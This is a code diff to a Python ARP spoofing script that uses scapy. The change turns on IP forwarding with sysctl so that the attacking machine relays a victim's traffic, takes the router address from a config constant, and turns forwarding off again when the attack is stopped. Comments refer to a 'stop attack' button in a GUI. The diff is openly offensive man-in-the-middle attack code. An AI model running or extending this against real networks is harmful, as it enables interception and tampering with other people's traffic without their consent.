@@ -1,6 +1,7 @@
 import time
 import scapy.all as scapy
-
+import subprocess
+from config.constants import DEFAULT_GATEWAY
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -23,7 +24,8 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 def main (target_ip):
-    router_ip="192.168.1.1"
+    subprocess.run('sysctl -w net.ipv4.ip_forward=1', shell=True) #enable port forwarding
+    router_ip=DEFAULT_GATEWAY
     try:
         sent_packets_count = 0
         while True:
@@ -35,4 +37,5 @@ def main (target_ip):
     except BaseException: #Bind to 'stop attack' button when connecting with gui
         restore(target_ip, router_ip)
         restore(router_ip, target_ip)
+        subprocess.run('sysctl -w net.ipv4.ip_forward=0', shell=True) #disable port forwarding
 
